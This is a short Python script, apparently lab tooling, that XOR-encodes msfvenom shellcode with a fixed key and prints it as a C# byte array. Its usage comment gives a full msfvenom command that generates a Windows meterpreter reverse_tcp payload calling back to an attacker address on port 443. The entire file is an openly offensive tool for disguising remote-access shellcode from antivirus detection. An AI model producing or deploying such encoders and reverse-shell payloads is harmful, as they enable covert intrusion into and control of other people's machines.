#!/usr/bin/env python3
import sys

''' Usage:
    ./xor_shellcode.py <msfvenom_ps1_payload>
    Example:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f ps1
    [Byte[]] $buf = 0xfc,0x48,...,0xff,0xd5
    ./xor_shellcode.py 0xfc,0x48,...,0xff,0xd5
'''

buf = sys.argv[1].split(',') or None
key = b'\xfa'

# int to hexstring; prefix 0x; pad 4 chars
buf = [f'{int(x, 0) ^ ord(key):#04x}' for x in buf]

# wrap every 12th character
res = [f'\n{ele}' if idx % 12 == 0 else ele for idx, ele in enumerate(buf)]
print(f'\nXOR with 0x{key.hex()}:\nbyte[] buf = new byte[{len(buf)}] {{{",".join(res)}}};')
